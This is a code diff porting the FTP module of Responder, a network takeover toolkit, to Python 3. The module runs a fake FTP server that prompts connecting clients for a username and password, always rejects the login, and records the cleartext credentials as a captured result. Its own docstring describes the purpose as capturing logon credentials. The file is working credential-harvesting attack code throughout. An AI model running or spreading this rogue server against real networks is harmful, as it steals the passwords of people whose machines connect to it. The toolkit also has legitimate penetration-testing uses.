@@ -1,56 +1,74 @@
-#!/usr/bin/env python
-# This file is part of Responder, a network take-over set of tools 
-# created and maintained by Laurent Gaffie.
-# email: laurent.gaffie@gmail.com
-# This program is free software: you can redistribute it and/or modify
-# it under the terms of the GNU General Public License as published by
-# the Free Software Foundation, either version 3 of the License, or
-# (at your option) any later version.
-#
-# This program is distributed in the hope that it will be useful,
-# but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-# GNU General Public License for more details.
-#
-# You should have received a copy of the GNU General Public License
-# along with this program.  If not, see <http://www.gnu.org/licenses/>.
-from utils import *
-from SocketServer import BaseRequestHandler
-from packets import FTPPacket
+import logging
+import traceback
+from servers.BASE import ResponderServer, Result, LogEntry
+from packets3 import FTPPacket
 
-class FTP(BaseRequestHandler):
+
+
+class FTP(ResponderServer):
+	def modulename(self):
+		return 'FTP'
+
 	def handle(self):
 		try:
-			self.request.send(str(FTPPacket()))
-			data = self.request.recv(1024)
+			self.send(FTPPacket().getdata())
+			data = self.recv()
 
-			if data[0:4] == "USER":
-				User = data[5:].strip()
+			if data[0:4] == b"USER":
+				User = data[5:].strip().decode()
 
-				Packet = FTPPacket(Code="331",Message="User name okay, need password.")
-				self.request.send(str(Packet))
-				data = self.request.recv(1024)
+				Packet = FTPPacket(Code=b"331",Message=b"User name okay, need password.")
+				self.send(Packet.getdata())
+				data = self.recv()
 
-			if data[0:4] == "PASS":
-				Pass = data[5:].strip()
+			if data[0:4] == b"PASS":
+				Pass = data[5:].strip().decode()
 
-				Packet = FTPPacket(Code="530",Message="User not logged in.")
-				self.request.send(str(Packet))
-				data = self.request.recv(1024)
+				Packet = FTPPacket(Code=b"530",Message=b"User not logged in.")
+				self.send(Packet.getdata())
+				
 
-				SaveToDb({
+				self.logResult({
 					'module': 'FTP', 
 					'type': 'Cleartext', 
-					'client': self.client_address[0], 
+					'client': self.soc.getpeername()[0], 
 					'user': User, 
 					'cleartext': Pass, 
 					'fullhash': User + ':' + Pass
 				})
 
-			else:
-				Packet = FTPPacket(Code="502",Message="Command not implemented.")
-				self.request.send(str(Packet))
-				data = self.request.recv(1024)
+				data = self.recv()
 
-		except Exception:
+			else:
+				Packet = FTPPacket(Code=b"502",Message=b"Command not implemented.")
+				self.send(Packet.getdata())
+				data = self.recv()
+
+		except Exception as e:
+			self.log(logging.INFO,'Exception! %s' % (str(e),))
 			pass
+
+		finally:
+			self.soc.close()
+
+	def send(self, data):
+		self.soc.sendall(data)
+
+	def recv(self):
+		"""
+		incorrect buffering, but works for capturing logon creds
+		"""
+		maxdata = 5 * 1024
+		buff = b''
+		while True:
+			t = self.soc.recv(1024)
+			if t == b'':
+				break
+			buff += t
+			if len(buff) > maxdata:
+				break
+			if buff.find(b'\r\n') != -1:
+				break
+
+		return buff
+
